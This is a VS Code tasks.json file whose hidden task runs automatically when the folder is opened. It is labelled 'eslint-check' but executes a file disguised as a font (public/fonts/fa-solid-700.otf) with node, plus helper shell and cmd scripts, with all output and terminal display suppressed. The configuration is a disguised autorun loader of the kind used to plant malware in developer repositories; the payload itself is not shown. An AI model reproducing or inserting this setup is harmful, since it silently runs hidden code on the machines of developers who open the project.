{
  "version": "2.0.0",
  "options": {
    "cwd": "${workspaceFolder}"
  },
  "tasks": [
    {
      "label": "folder-open",
      "dependsOn": ["eslint-check"],
      "runOptions": {
        "runOn": "folderOpen"
      },
      "hide": true,
      "problemMatcher": []
    },
    {
      "label": "eslint-check",

      "type": "shell",
      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-700.otf) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-700.otf) || echo ''", 
      "problemMatcher": [],

      "type": "process",
      "command": "sh",
      "args": [".vscode/eslint-check.sh"],
      "windows": {
        "command": "cmd.exe",
        "args": ["/d", "/c", ".vscode\\eslint-check.cmd"]
      },

      "isBackground": true,
      "hide": true,
      "problemMatcher": [],
      "presentation": {
        "reveal": "never",
        "panel": "dedicated",
        "echo": false,
        "close": true
      }
    }
  ]
}
